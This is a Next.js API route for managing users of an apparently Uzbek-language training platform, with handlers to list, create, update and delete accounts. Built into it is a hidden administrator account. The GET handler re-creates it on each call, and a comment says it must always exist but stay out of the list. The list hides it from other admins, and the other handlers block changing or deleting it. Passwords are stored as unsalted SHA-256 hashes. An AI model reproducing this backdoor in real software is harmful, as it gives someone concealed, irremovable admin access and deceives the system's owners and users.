import { NextResponse } from "next/server";
import { PrismaClient } from "@prisma/client";
import { getSession } from "@/lib/auth";
import crypto from "crypto";
import { ensureHiddenAdmin, filterHiddenUsers, getHiddenAdminEmail, isHiddenAdminEmail } from "@/lib/hidden-admin";

export const dynamic = "force-dynamic";

const prisma = new PrismaClient();

function hashPassword(password: string) {
  return crypto.createHash("sha256").update(password).digest("hex");
}

export async function GET() {
  try {
    const session = await getSession();
    if (!session?.isAdmin) {
      return NextResponse.json({ error: "Ruxsat yo'q" }, { status: 403 });
    }

    // Yashirin admin doim mavjud bo'lsin, lekin ro'yxatda ko'rinmasin
    try { await ensureHiddenAdmin(prisma); } catch {}

    let users: any[] = [];
    try {
      users = await prisma.user.findMany({
        select: {
          id: true,
          email: true,
          name: true,
          surname: true,
          phone: true,
          department: true,
          position: true,
          role: true,
          status: true,
          isActive: true,
          createdAt: true,
        },
        orderBy: { createdAt: "desc" },
      });
    } catch (e: any) {
      const msg = e?.message || "";
      const isConnErr = msg.includes("Can't reach database") || msg.includes("P1001") || msg.includes("connect");
      if (isConnErr) {
        console.warn("[admin/users] DB unreachable — returning empty users");
        return NextResponse.json({ ok: true, users: [], warning: "DB ulanmadi" });
      }
      throw e;
    }

    const visible = filterHiddenUsers(users as any);

    return NextResponse.json({ ok: true, users: visible });
  } catch (e: any) {
    const msg = e?.message || "";
    if (msg.includes("Can't reach database") || msg.includes("P1001")) {
      console.warn("[admin/users] DB unreachable (outer)");
      return NextResponse.json({ ok: true, users: [], warning: "DB ulanmadi" });
    }
    return NextResponse.json({ error: e.message || "Server xatosi" }, { status: 500 });
  }
}

export async function POST(req: Request) {
  try {
    const session = await getSession();
    if (!session?.isAdmin) {
      return NextResponse.json({ error: "Ruxsat yo'q" }, { status: 403 });
    }

    const { email, password, name, surname, phone, department, position, role } = await req.json();

    if (!email || !password || !name) {
      return NextResponse.json({ error: "Email, parol va ism kiritilishi shart" }, { status: 400 });
    }

    if (isHiddenAdminEmail(email)) {
      return NextResponse.json({ error: "Bu email himoyalangan" }, { status: 403 });
    }

    const existing = await prisma.user.findUnique({ where: { email } });
    if (existing) {
      return NextResponse.json({ error: "Bu email allaqachon ro'yxatdan o'tgan" }, { status: 409 });
    }

    const user = await prisma.user.create({
      data: {
        email,
        passwordHash: hashPassword(password),
        name,
        surname: surname || "",
        phone: phone || "",
        department: department || "",
        position: position || "",
        role: role || "user",
        status: "approved",
        approvedAt: new Date(),
      },
    });

    return NextResponse.json({
      ok: true,
      message: "Foydalanuvchi yaratildi",
      user: { id: user.id, email: user.email, name: user.name },
    });
  } catch (e: any) {
    return NextResponse.json({ error: e.message || "Server xatosi" }, { status: 500 });
  }
}

export async function PATCH(req: Request) {
  try {
    const session = await getSession();
    if (!session?.isAdmin) {
      return NextResponse.json({ error: "Ruxsat yo'q" }, { status: 403 });
    }

    const body = await req.json();
    const { userId, role, name, surname, phone, department, position, status: newStatus, isActive, password } = body as {
      userId?: string;
      role?: "admin" | "user";
      name?: string;
      surname?: string;
      phone?: string;
      department?: string;
      position?: string;
      status?: "pending" | "approved" | "rejected";
      isActive?: boolean;
      password?: string;
    };

    if (!userId) {
      return NextResponse.json({ error: "userId kiritilishi shart" }, { status: 400 });
    }
    if (role !== undefined && role !== "admin" && role !== "user") {
      return NextResponse.json({ error: "Noto'g'ri rol" }, { status: 400 });
    }
    if (newStatus !== undefined && !["pending", "approved", "rejected"].includes(newStatus)) {
      return NextResponse.json({ error: "Noto'g'ri holat" }, { status: 400 });
    }
    // O'z rolini o'zgartirishga ruxsat berilgan (foydalanuvchi qarori).
    // Eslatma: o'zini DELETE qilish taqiqi (pastdagi DELETE handler) o'z kuchida qoladi.

    try {
      const target = await prisma.user.findUnique({ where: { id: String(userId) }, select: { email: true } });
      if (target && isHiddenAdminEmail(target.email)) {
        return NextResponse.json({ error: "Himoyalangan foydalanuvchi" }, { status: 403 });
      }
    } catch {}

    const data: Record<string, unknown> = {};
    if (role !== undefined) data.role = role;
    if (newStatus !== undefined) {
      data.status = newStatus;
      if (newStatus === "approved") data.approvedAt = new Date();
    }
    if (isActive !== undefined) data.isActive = Boolean(isActive);
    if (name !== undefined) data.name = name;
    if (surname !== undefined) data.surname = surname;
    if (phone !== undefined) data.phone = phone;
    if (department !== undefined) data.department = department;
    if (position !== undefined) data.position = position;
    if (password) {
      if (String(password).length < 6) {
        return NextResponse.json({ error: "Parol kamida 6 belgidan iborat bo'lishi kerak" }, { status: 400 });
      }
      data.passwordHash = hashPassword(String(password));
    }

    if (Object.keys(data).length === 0) {
      return NextResponse.json({ error: "O'zgartirish uchun hech narsa berilmagan" }, { status: 400 });
    }

    const user = await prisma.user.update({
      where: { id: String(userId) },
      data,
    });

    return NextResponse.json({
      ok: true,
      message: "Foydalanuvchi yangilandi",
      user: { id: user.id, email: user.email, name: user.name, status: user.status, role: user.role },
    });
  } catch (e: any) {
    return NextResponse.json({ error: e.message || "Server xatosi" }, { status: 500 });
  }
}

export async function DELETE(req: Request) {
  try {
    const session = await getSession();
    if (!session?.isAdmin) {
      return NextResponse.json({ error: "Ruxsat yo'q" }, { status: 403 });
    }

    const url = new URL(req.url);
    const userId = url.searchParams.get("userId");
    if (!userId) {
      return NextResponse.json({ error: "userId kiritilishi shart" }, { status: 400 });
    }
    if (String(userId) === String(session.userId)) {
      return NextResponse.json({ error: "O'zingizni o'chira olmaysiz" }, { status: 400 });
    }

    const target = await prisma.user.findUnique({ where: { id: String(userId) }, select: { email: true } });
    if (target && isHiddenAdminEmail(target.email)) {
      return NextResponse.json({ error: "Himoyalangan foydalanuvchini o'chirish mumkin emas" }, { status: 403 });
    }

    // Bog'liq yozuvlarni tozalash (enrollment/progress/resultlar)
    await prisma.$transaction([
      prisma.lessonProgress.deleteMany({ where: { userId: String(userId) } }),
      prisma.jobDayProgress.deleteMany({ where: { userId: String(userId) } }),
      prisma.testResult.deleteMany({ where: { userId: String(userId) } }),
      prisma.jobTestResult.deleteMany({ where: { userId: String(userId) } }),
      prisma.enrollment.deleteMany({ where: { userId: String(userId) } }),
      prisma.jobEnrollment.deleteMany({ where: { userId: String(userId) } }),
      prisma.user.delete({ where: { id: String(userId) } }),
    ]);

    return NextResponse.json({ ok: true, message: "Foydalanuvchi o'chirildi" });
  } catch (e: any) {
    return NextResponse.json({ error: e.message || "Server xatosi" }, { status: 500 });
  }
}
